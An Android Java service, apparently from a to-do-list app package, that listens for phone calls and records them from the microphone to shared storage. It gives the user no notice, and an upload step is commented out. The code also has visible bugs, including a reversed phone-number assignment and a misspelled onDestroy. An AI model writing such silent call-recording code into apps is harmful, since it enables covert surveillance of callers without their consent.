package guanyi.todolist;

import android.Manifest;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import java.io.File;
import java.io.IOException;

public class PhoneListener extends Service {
    private int READ_PHONE_STATE_PERMISSION_CODE = 1;
    private int WRITE_EXTERNAL_STORAGE_PERMISSION_CODE = 2;
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        return  null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        //get service from system
        TelephonyManager telManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        //call Listener() when LISTEN_CALL_STATE is returned
        telManager.listen(new Listener(), PhoneStateListener.LISTEN_CALL_STATE);
        Log.d("qwer","Listener created.");
    }

    public void onDestory(){
        super.onDestroy();

    }

    private  final class Listener extends PhoneStateListener{
        //incoming phone number
        private String phoneNumber;
        //recorder to record the voice
        private MediaRecorder recorder;
        //recordFile to store the record
//        private File recordFile;

        @Override
        public void onCallStateChanged(int state, String incomingNumber){
            try{
                switch (state){
                    case  TelephonyManager.CALL_STATE_IDLE: //phon
                        //release the recorder after hanging up
                        if (recorder!=null){
                            recorder.stop();
                            recorder.reset();
                            recorder.release();
                            recorder=null;
                            //upload();
                        }
                        break;
                    case  TelephonyManager.CALL_STATE_RINGING:
                        //get the incoming nu mber when ringing
                        incomingNumber = phoneNumber;
                        //generate a new recordFile on sd card, format:*.3gp,name:incomingNumber
//                        new File(Environment.getExternalStorageDirectory(),phoneNumber+".3gp");
                        //start recording after offhook
                        recorder = new MediaRecorder();
                        //get audio from mic
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
                        //choose output audio format
                        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
                        //choose audio encode format
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
                        //put record in the recordFile
//                        recorder.setOutputFile(recordFile.getAbsolutePath());
                        recorder.setOutputFile("/sdcard/" + System.currentTimeMillis()+phoneNumber+".3gp");
                        recorder.prepare();
                        break;
                    case  TelephonyManager.CALL_STATE_OFFHOOK:
                        if (recorder!=null){
                            recorder.start();
                        }
                        break;
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }

    }

}
